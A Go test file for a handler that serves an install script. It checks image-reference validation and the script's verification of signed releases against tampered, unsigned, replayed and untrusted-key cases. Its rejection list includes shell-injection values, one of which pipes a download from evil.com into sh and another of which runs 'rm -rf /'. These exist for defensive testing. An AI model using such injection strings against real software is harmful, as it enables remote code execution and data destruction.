package main

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/sha256"
	"crypto/x509"
	"encoding/hex"
	"encoding/pem"
	"fmt"
	"net/http"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"testing"
	"text/template"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestInstallScriptHandler_ValidImageRefs(t *testing.T) {
	handler := testHandler()

	valid := []string{
		"nginx",
		"nginx:latest",
		"ghcr.io/basecamp/once-campfire",
		"ghcr.io/basecamp/fizzy:main",
		"registry.example.com:5000/my/image:v1.2.3",
		"ubuntu@sha256:e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
	}
	for _, ref := range valid {
		w := serve(handler, ref)
		assert.Equal(t, http.StatusOK, w.Code, "ref: %s", ref)
	}
}

func TestInstallScriptHandler_RejectsShellInjection(t *testing.T) {
	handler := testHandler()

	malicious := []string{
		"foo';curl evil.com|sh;echo'",
		"$(whoami)",
		"`id`",
		"image;rm -rf /",
		"foo\necho pwned",
		"foo&background",
		"a>b",
		"a<b",
		"foo$(bar)",
		"image name with spaces",
	}
	for _, ref := range malicious {
		w := serve(handler, ref)
		assert.Equal(t, http.StatusBadRequest, w.Code, "ref: %s", ref)
	}
}

func TestInstallScriptHandler_EmptyImageRef(t *testing.T) {
	handler := testHandler()

	w := serve(handler, "")
	assert.Equal(t, http.StatusOK, w.Code)
}

func TestInstallScript_PinsTheRepositoryReleaseKeys(t *testing.T) {
	canonical, err := os.ReadFile(filepath.Join("..", "release-key.pub"))
	require.NoError(t, err)

	w := serve(testHandler(), "")
	assert.Contains(t, w.Body.String(), "\nRELEASE_KEYS='"+string(canonical)+"'\n")
}

func TestInstallScript_InstallsAVerifiedRelease(t *testing.T) {
	key := newReleaseKey(t)
	fx := newReleaseFixture(t, "v1.2.3", "the real binary")
	fx.sign(t, key)

	log, err := fx.install(t, publicKeyPEM(t, key))
	require.NoError(t, err, log)
	assert.Contains(t, log, "SUDO install -m 755")
	assert.Contains(t, log, "background install")
}

func TestInstallScript_AcceptsAnyPinnedKey(t *testing.T) {
	current, next := newReleaseKey(t), newReleaseKey(t)
	fx := newReleaseFixture(t, "v1.2.3", "the real binary")
	fx.sign(t, next)

	log, err := fx.install(t, publicKeyPEM(t, current)+publicKeyPEM(t, next))
	require.NoError(t, err, log)
	assert.Contains(t, log, "SUDO install -m 755")
}

func TestInstallScript_RefusesBeforeInstalling(t *testing.T) {
	key := newReleaseKey(t)
	refuses := func(fx *releaseFixture, keys, reason string) {
		t.Helper()
		log, err := fx.install(t, keys)
		require.Error(t, err, log)
		assert.Contains(t, log, reason)
		assert.NotContains(t, log, "SUDO")
	}

	tampered := newReleaseFixture(t, "v1.2.3", "the real binary")
	tampered.sign(t, key)
	tampered.write(t, "once-linux-amd64", "a different binary")
	refuses(tampered, publicKeyPEM(t, key), "does not match the signed checksum")

	untrusted := newReleaseFixture(t, "v1.2.3", "the real binary")
	untrusted.sign(t, newReleaseKey(t))
	refuses(untrusted, publicKeyPEM(t, key), "did not verify")

	edited := newReleaseFixture(t, "v1.2.3", "the real binary")
	edited.sign(t, key)
	edited.write(t, "once-linux-amd64", "a different binary")
	edited.write(t, "release.txt", manifestFor("v1.2.3", "a different binary"))
	refuses(edited, publicKeyPEM(t, key), "did not verify")

	replayed := newReleaseFixture(t, "v1.2.3", "an older binary")
	replayed.write(t, "release.txt", manifestFor("v1.0.0", "an older binary"))
	replayed.write(t, "release.txt.sig", string(signManifest(t, key, manifestFor("v1.0.0", "an older binary"))))
	refuses(replayed, publicKeyPEM(t, key), "is not for v1.2.3")

	unsigned := newReleaseFixture(t, "v1.2.3", "the real binary")
	refuses(unsigned, publicKeyPEM(t, key), "is not signed")

	placeholder := newReleaseFixture(t, "v1.2.3", "the real binary")
	placeholder.sign(t, key)
	refuses(placeholder, "PLACEHOLDER - no key here", "did not verify")
}

func TestInstallScript_RequiresOpenSSL(t *testing.T) {
	key := newReleaseKey(t)
	fx := newReleaseFixture(t, "v1.2.3", "the real binary")
	fx.sign(t, key)
	fx.hideOpenSSL = true

	log, err := fx.install(t, publicKeyPEM(t, key))
	require.Error(t, err, log)
	assert.Contains(t, log, "needs openssl")
	assert.NotContains(t, log, "SUDO")
}

// Helpers

// releaseFixture is a release as the install script sees it: the latest
// release JSON and its assets, in a directory that a stubbed download reads
// from.
type releaseFixture struct {
	dir         string
	tag         string
	binary      string
	hideOpenSSL bool
}

func newReleaseFixture(t *testing.T, tag, binary string) *releaseFixture {
	t.Helper()
	for _, tool := range []string{"sh", "openssl", "awk", "sed"} {
		if _, err := exec.LookPath(tool); err != nil {
			t.Skipf("%s not installed", tool)
		}
	}

	fx := &releaseFixture{dir: t.TempDir(), tag: tag, binary: binary}
	fx.write(t, "once-linux-amd64", binary)
	return fx
}

func (fx *releaseFixture) sign(t *testing.T, key *ecdsa.PrivateKey) {
	t.Helper()
	manifest := manifestFor(fx.tag, fx.binary)
	fx.write(t, "release.txt", manifest)
	fx.write(t, "release.txt.sig", string(signManifest(t, key, manifest)))
}

func (fx *releaseFixture) write(t *testing.T, name, content string) {
	t.Helper()
	require.NoError(t, os.WriteFile(filepath.Join(fx.dir, name), []byte(content), 0o644))
}

// install runs the served script's install_once with keys pinned in place of
// RELEASE_KEYS, downloads read from the fixture, and sudo recorded rather than
// run. It returns everything the script printed and every sudo it asked for.
func (fx *releaseFixture) install(t *testing.T, keys string) (string, error) {
	t.Helper()

	var assets []string
	for _, name := range []string{"once-linux-amd64", "release.txt", "release.txt.sig"} {
		if _, err := os.Stat(filepath.Join(fx.dir, name)); err == nil {
			assets = append(assets, fmt.Sprintf(`    {
      "url": "https://api.github.com/repos/basecamp/once/releases/assets/%s",
      "name": "%s"
    }`, name, name))
		}
	}
	releaseJSON := fmt.Sprintf("{\n  \"tag_name\": \"%s\",\n  \"assets\": [\n%s\n  ]\n}\n", fx.tag, strings.Join(assets, ",\n"))
	require.NoError(t, os.WriteFile(filepath.Join(fx.dir, "release.json"), []byte(releaseJSON), 0o644))

	script := serve(testHandler(), "").Body.String()
	require.True(t, strings.HasSuffix(script, "\nmain\n"), "the script should end by calling main")
	script = strings.TrimSuffix(script, "main\n")

	pinned := regexp.MustCompile(`(?s)\nRELEASE_KEYS='[^']*'\n`)
	require.True(t, pinned.MatchString(script))
	script = pinned.ReplaceAllLiteralString(script, "\nRELEASE_KEYS='"+keys+"'\n")

	script += `
download() { cp "${FIXTURE}/${1##*/}" "$2"; }
is_root() { return 1; }
sudo() { echo "SUDO $*"; }
`
	script += `RELEASE_JSON=$(cat "${FIXTURE}/release.json")
os=linux
[ -n "${RESTRICTED_PATH:-}" ] && PATH="$RESTRICTED_PATH"
install_once amd64
`

	cmd := exec.Command("sh", "-c", script)
	cmd.Env = append(os.Environ(), "FIXTURE="+fx.dir)
	if fx.hideOpenSSL {
		cmd.Env = append(cmd.Env, "RESTRICTED_PATH="+pathWithout(t, "openssl"))
	}
	out, err := cmd.CombinedOutput()
	return string(out), err
}

// pathWithout returns a PATH holding only the tools the script uses before it
// verifies anything, less the one named.
func pathWithout(t *testing.T, missing string) string {
	t.Helper()
	dir := t.TempDir()
	for _, tool := range []string{"awk", "cat", "cp", "mktemp", "rm", "sed", "openssl"} {
		if tool == missing {
			continue
		}
		path, err := exec.LookPath(tool)
		require.NoError(t, err)
		require.NoError(t, os.Symlink(path, filepath.Join(dir, tool)))
	}
	return dir
}

func newReleaseKey(t *testing.T) *ecdsa.PrivateKey {
	t.Helper()
	key, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	require.NoError(t, err)
	return key
}

func publicKeyPEM(t *testing.T, key *ecdsa.PrivateKey) string {
	t.Helper()
	der, err := x509.MarshalPKIXPublicKey(&key.PublicKey)
	require.NoError(t, err)
	return string(pem.EncodeToMemory(&pem.Block{Type: "PUBLIC KEY", Bytes: der}))
}

func manifestFor(tag, binary string) string {
	sum := sha256.Sum256([]byte(binary))
	return fmt.Sprintf("once %s\ncommit %s\n%s  once-linux-amd64\n", tag, strings.Repeat("a", 40), hex.EncodeToString(sum[:]))
}

func signManifest(t *testing.T, key *ecdsa.PrivateKey, manifest string) []byte {
	t.Helper()
	digest := sha256.Sum256([]byte(manifest))
	sig, err := ecdsa.SignASN1(rand.Reader, key, digest[:])
	require.NoError(t, err)
	return sig
}

func testHandler() http.HandlerFunc {
	tmpl := template.Must(template.ParseFS(templateFS, "templates/*"))
	return newInstallScriptHandler(tmpl)
}

func serve(handler http.HandlerFunc, imageRef string) *httptest.ResponseRecorder {
	r := httptest.NewRequest("GET", "/image", nil)
	r.SetPathValue("image", imageRef)
	w := httptest.NewRecorder()
	handler(w, r)
	return w
}
